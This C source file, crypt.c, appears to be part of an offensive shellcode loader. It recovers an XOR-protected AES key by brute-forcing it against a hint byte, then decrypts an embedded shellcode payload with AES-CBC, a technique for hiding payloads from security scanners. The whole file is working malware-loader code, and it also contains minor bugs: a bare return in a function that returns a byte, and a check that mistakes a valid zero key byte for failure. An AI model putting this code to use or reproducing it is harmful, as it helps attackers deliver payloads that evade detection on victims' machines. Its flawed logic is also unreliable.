/*
 *  ~ crypt.c ~
 * Key brute-force and payload [en/de]cryption
 * Author: jakobfriedl
 */ 

#include "base.h"
#include <time.h>

/*
 * Decrypt AES encrypted shellcode after brute-forcing decryption key
 *
 * @param pEncShellcode: Encrypted shellcode
 * @param sSize: Size of the encrypted shellcode
 *
 * @returns: TRUE/FALSE if succeeded/failed
 */
BOOL Decrypt(IN PBYTE pEncShellcode, IN SIZE_T sSize) {
    
    PRINTA("\n[~~~] Decrypting payload...\n"); 

    // AES variables
    struct AES_ctx ctx;
    
    PBYTE pRealKey = NULL; 
    unsigned char pProtectedKey[] = {
        0x18, 0xCF, 0xC4, 0x29, 0x25, 0x83, 0xF3, 0x3C, 0x8E, 0xC7, 0x1A, 0x6D, 0x89, 0xBE, 0xF9, 0xF9,
        0xFD, 0x9F, 0x2D, 0x69, 0x05, 0x04, 0x00, 0x55, 0x85, 0x37, 0xDD, 0xF5, 0x86, 0xFE, 0x84, 0x68 };

    unsigned char pIv[] = {
            0x03, 0xF6, 0x44, 0x93, 0xEC, 0x41, 0x90, 0x6C, 0x70, 0xCA, 0xFA, 0x5C, 0x50, 0x5C, 0xF4, 0xA4 };

    // Brute force key decryption key 
    if (!BruteForceDecryptionKey(HINT_BYTE, pProtectedKey, sizeof(pProtectedKey), &pRealKey)) {
        PRINT_ERROR("BruteForceDecryptionKey");
        return FALSE;
    }
    OKAY("[ 0x%p ] Brute-forced decryption key.", pRealKey);
    PrintByteArray(pRealKey, sizeof(pProtectedKey));

    // Initialize AES
    AES_init_ctx_iv(&ctx, pRealKey, pIv);

    // Decrypt payload 
    AES_CBC_decrypt_buffer(&ctx, pEncShellcode, sSize);

    return TRUE; 
}

/*
 * Brute-force XOR protected key with the help of a HintByte
 *
 * @param HintByte: Hint byte to help the brute-force decryption
 * @param pProtectedKey: XOR protected key
 * @param sKey: Size of the protected key
 * @param ppRealKey: Pointer to store the real, decrypted key
 *
 * @returns: Byte used for decryption
 */
BYTE BruteForceDecryptionKey(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

    BYTE b = 0;

    // Allocate memory for key
    PBYTE pRealKey = (PBYTE)LocalAlloc(LPTR, sKey); 

    if (!pRealKey) {
        PRINT_ERROR("malloc");
        return;
    }

    // Brute force key based on hint byte
    while (TRUE) {

        // Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
        if (((pProtectedKey[0] ^ b) - 0) == HintByte) {
            OKAY("Found matching key value: 0x%0.2X", b);
            break;
        }

        // Increment b and try again
        b++;
    }

    for (int i = 0; i < sKey; i++) {
        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }

    *ppRealKey = pRealKey;

    return b;
}
